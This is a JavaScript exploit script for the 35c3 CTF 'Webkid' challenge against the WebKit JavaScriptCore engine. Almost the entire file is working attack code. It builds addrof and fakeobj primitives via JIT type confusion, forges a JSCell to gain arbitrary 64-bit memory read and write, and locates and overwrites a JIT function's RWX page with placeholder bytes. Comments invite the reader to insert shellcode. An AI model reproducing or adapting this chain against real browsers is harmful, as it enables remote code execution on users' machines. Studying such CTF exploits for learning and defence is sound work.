var _dview = null;

function u2d(low, hi) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setUint32(0,hi);
    _dview.setUint32(4,low);
    return _dview.getFloat64(0);
}

function d2u(d) {
    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
    _dview.setFloat64(0,d);
    return [_dview.getUint32(4), _dview.getUint32(0)];
}


function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }

    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }

    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}

const ITERATIONS = 100000;

function jitCompile(f, ...args) {
    for (var i = 0; i < ITERATIONS; i++) {
        f(...args);
    }
}

jitCompile(function dummy() { return 42; });

function makeJITCompiledFunction() {
    // Some code that can be overwritten by the shellcode.
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return "ffff";
            }
        }
        return "tttt";
    }
    jitCompile(target, 123);

    return target;
}

// first structure
let arr = [1.1, 2.2];
// second structure
arr.prop1 = {};

function get_elem() {
	return arr[0];
}

function set_elem(value) {
	arr[0] = value;
}

function addrof(value) {
	arr[0] = value;
	return get_elem();
}

function fakeobj(value) {
	set_elem(value);
	return arr[0];
}

function pwn() {
	print("35c3 ctf Webkid Challenge Exploitation by asiagaming");

	// optimize these functions
	for(let i = 0;i < 10000; i++) {
		get_elem();
		set_elem(1.1);
	}

	// back arr's structure to first one
	delete arr.prop1;

    let storage = [];
    for(let i = 0; i < 0x2000; i++) {
        let a = [13.37];
        a.pointer = u2d(0xdadadada, 0xfafafafa);
        a["a" + i] = 1.1;
        storage.push(a);
    }
    let victim = storage[0x800];

    let obj = {
        JSCell: u2d(0x1000, 0x01082007 - 0x10000),
        butterfly: victim
    };

	let obj_addr = d2u(addrof(obj));
	print("obj addr : " + hex(obj_addr[0], [1]));

	// fake's butterfly -> victim : structure | butterfly
	let fake = fakeobj(u2d(obj_addr[0] + 0x10, obj_addr[1]));
	let jscell = d2u(fake.pointer);
	print("jscell : " + hex(jscell[0], jscell[1]));

	obj.JSCell = u2d(jscell[0], jscell[1] - 0x10000);

	let memory = {
		addrof: addrof,
		fakeobj: fakeobj,
		read64: function(addr) {
			fake[1] = addr;
			return this.addrof(victim.pointer);
		},

		write64: function(addr, value) {
			fake[1] = addr;
			victim.pointer = value;
		}
	};

	let func = makeJITCompiledFunction();
	let func_addr = d2u(addrof(func));
	print("func addr : " + hex(func_addr[0], func_addr[1]));

	let jit_obj_addr = d2u(memory.read64(u2d(func_addr[0] + 0x10 + 0x18, func_addr[1])));
	print("jit_obj_addr : " + hex(jit_obj_addr[0], jit_obj_addr[1]));

	let rwx_page_addr = d2u(memory.read64(u2d(jit_obj_addr[0] + 0x10 + 0x18, jit_obj_addr[1])));
	print("rwx_page_addr : " + hex(rwx_page_addr[0], rwx_page_addr[1]));

	for(let i = 0; i < 0x1000; i++) {
		memory.write64(u2d(rwx_page_addr[0] + 0x10 + (i * 8), rwx_page_addr[1]), u2d(0xcccccccc, 0xcccccccc - 0x10000));
	}

	// inject your shellcode :)
	// enjoy !
	func();
}

pwn();
